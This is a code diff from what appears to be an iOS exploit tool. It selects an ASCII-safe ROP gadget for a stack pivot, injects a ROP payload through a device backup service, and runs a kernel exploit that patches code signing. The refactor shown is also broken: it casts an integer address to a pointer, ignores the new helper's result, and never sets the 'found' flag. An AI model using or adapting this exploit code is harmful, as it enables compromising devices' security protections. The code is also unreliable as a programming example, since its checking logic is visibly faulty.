@@ -33,6 +33,38 @@
 #define sleep(x) Sleep(x*1000)
 #endif
 
+////////////////////////////////////////////////////////////////////////////////////////
+// TODO: We need to add an event handler for when devices are connected. This handler //
+//         needs to wait for iTunes to autostart and kill it before it can start the  //
+//         syncing process and mess up our connection.                                //
+////////////////////////////////////////////////////////////////////////////////////////
+
+typedef enum {
+	kFalse = 0, kTrue = 1
+} bool;
+
+int check_ascii_string(const char* string, size_t length) {
+	size_t i = 0;
+
+	bool valid = kTrue;
+	if (string) {
+		// Loop through each byte in this string and make sure it contains no invalid
+		//  ASCII characters that might screw up our exploit
+		for (i = 0; i < length; i++) {
+			char letter = string[i];
+			if ((letter & 0x80) || (letter & ~0x7F)) {
+				// We have an invalid ASCII character here folks!
+				valid = kFalse;
+				break;
+			}
+		}
+	}
+
+	// We return an index to the invalid character, or 0 if everything was successful
+	if(valid) i = 0;
+	return i;
+}
+
 int main(int argc, char* argv[]) {
 	int err = 0;
 
@@ -107,35 +139,23 @@ int main(int argc, char* argv[]) {
 	// TODO: This code here needs to be stuck in a separate function, it looks ugly here
 	int i = 0;
 	int found = 0;
-	unsigned int address = 0;
+	uint32_t address = 0;
 	// Loop through each ROP gadget for this firmware and find one in a nice ascii
 	//  safe address for our stack pivot
-	for(i = 0; offsets[i].offset != 0; i++){
+	for (i = 0; offsets[i].offset != 0; i++) {
 		address = crash->dylibs[2]->offset + offsets[i].offset;
-		// Make sure none of the bytes have their highest bit set
-		// This ensures all bytes will pass the ASCII filter
-		if((address & 0x80808080) == 0
-				// Make sure the address has no NULL's in it
-				// This will cause our string to terminate prematurely
-				&& (address & 0x7F000000) != 0
-				&& (address & 0x007F0000) != 0
-				&& (address & 0x00007F00) != 0
-				&& (address & 0x0000007F) != 0) {
-			found = 1;
-			break;
-		}
+		check_ascii_string((const char*) address, 4);
 	}
 
-	if(found == 0) {
+	if (found == 0) {
 		error("Unable to find ASCII safe gadget address for stack pivot\n");
 		return -1;
-	}
-	info("Usable ASCII safe gadget address found at 0x%08x\n", address);
+	}info("Usable ASCII safe gadget address found at 0x%08x\n", address);
 
 	int size = 0;
 	char* attack = NULL;
 	err = dictionary_make_attack(address, &attack, &size);
-	if(err < 0) {
+	if (err < 0) {
 		error("Unable to make dictionary attack string for injection\n");
 		return -1;
 	}
@@ -148,7 +168,7 @@ int main(int argc, char* argv[]) {
 	//  and stack are randomized on each execution.
 	info("Injecting ROP payload and leaking it's addresss\n");
 	err = mb2_inject(mb2, attack, size);
-	if(err < 0) {
+	if (err < 0) {
 		error("Unable to inject ROP payload or discover it's offset\n");
 		device_free(device);
 		return -1;
@@ -158,7 +178,7 @@ int main(int argc, char* argv[]) {
 	//  pivot the stack onto our ROP payload and execute our kernel vulnerability.
 	info("Executing kernel exploit and patching codesign\n");
 	err = mb2_exploit(mb2);
-	if(err < 0) {
+	if (err < 0) {
 		error("Unable to execute kernel exploit and patch codesign\n");
 		device_free(device);
 		return -1;
